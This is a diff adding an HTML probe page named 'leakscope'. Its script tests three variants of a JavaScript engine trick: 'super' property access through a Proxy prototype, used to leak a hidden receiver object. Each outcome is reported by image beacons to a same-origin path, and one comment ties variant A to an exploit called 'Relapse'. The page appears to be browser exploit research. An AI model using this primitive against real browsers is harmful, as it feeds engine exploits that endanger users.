@@ -1,0 +1,31 @@
+<!doctype html><html><head><meta charset="utf-8"><title>leakscope</title></head><body>
+<script>
+function mark(t){ try { (new Image()).src = '/beacon/LEAK-' + encodeURIComponent(String(t).slice(0,150)) + '?t=' + Date.now(); } catch(e){} }
+function describe(v){ try { return (v === null ? 'null' : (v === undefined ? 'undefined' : (typeof v) + ':' + Object.prototype.toString.call(v))); } catch(e){ return 'DESC-ERR:' + e.message; } }
+mark('BOOT');
+// A: the shape Relapse uses
+try {
+  class Leaker { leak() { return super.foo; } }
+  Leaker.prototype.__proto__ = new Proxy({}, { get: function (t, p, r) { return r; } });
+  var leak = Leaker.prototype.leak;
+  var a = (function () { return leak(); })();
+  mark('A:' + describe(a));
+  if (a) { mark('A-keys:' + Object.getOwnPropertyNames(a).slice(0,6).join(',')); }
+} catch (e) { mark('A-ERR:' + e.message); }
+// B: get trap returns the target
+try {
+  class L2 { leak() { return super.bar; } }
+  var tgt = { bar: 41 };
+  L2.prototype.__proto__ = new Proxy(tgt, { get: function (t, p, r) { return Reflect.get(t, p, r); } });
+  var b = (function () { var f = L2.prototype.leak; return f(); })();
+  mark('B:' + describe(b) + '=' + String(b));
+} catch (e) { mark('B-ERR:' + e.message); }
+// C: what does super resolve to at all
+try {
+  class L3 { leak() { return Object.getPrototypeOf(this); } }
+  L3.prototype.__proto__ = new Proxy({}, { get: function (t, p, r) { return 'GOT:' + String(p); } });
+  var c = (function () { var f = L3.prototype.leak; return f(); })();
+  mark('C:' + describe(c) + '/' + String(c));
+} catch (e) { mark('C-ERR:' + e.message); }
+mark('DONE');
+</script></body></html>
